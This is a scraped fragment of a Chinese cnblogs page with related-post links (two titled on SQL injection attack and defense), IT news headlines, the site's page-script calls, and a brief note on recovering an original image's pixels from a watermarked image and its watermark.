· [SQL 注入攻防入门详解](https://www.cnblogs.com/bily101/archive/2013/05/03/3055745.html "SQL注入攻防入门详解")  
· [SQL 注入攻防入门详解](https://www.cnblogs.com/chorrysky/archive/2013/02/22/2922034.html "SQL注入攻防入门详解")

**最新 IT 新闻**:  
· [掉入黑洞会怎样？被拉成“面条”，还是前往另一个宇宙？](//news.cnblogs.com/n/641596/)  
· [“走出非洲”的观点已经过时？](//news.cnblogs.com/n/641595/)  
· [卓易科技和优刻得科创板过会](//news.cnblogs.com/n/641594/)  
· [牛津博士大胆设想：平流层中借西风，氢气飞艇零耗能](//news.cnblogs.com/n/641593/)  
· [阿里和谷歌自研 AI 芯片商用，科技巨头与芯片巨头关系生变](//news.cnblogs.com/n/641592/)  
» [更多新闻...](https://news.cnblogs.com/ "IT 新闻")

fixPostBody(); setTimeout(function () { incrementViewCount(cb_entryId); }, 50); deliverAdT2(); deliverAdC1(); deliverAdC2(); loadNewsAndKb(); loadBlogSignature(); LoadPostCategoriesTags(cb_blogId, cb_entryId); LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid); GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType); loadOptUnderPost(); GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);

### 原理

利用水印像素点和原图像素点颜色合并的原理，如果拥有加过水印的图片和水印图片，就可以反向推出原图原像素点的颜色；前提是你得拥有他的水印图片
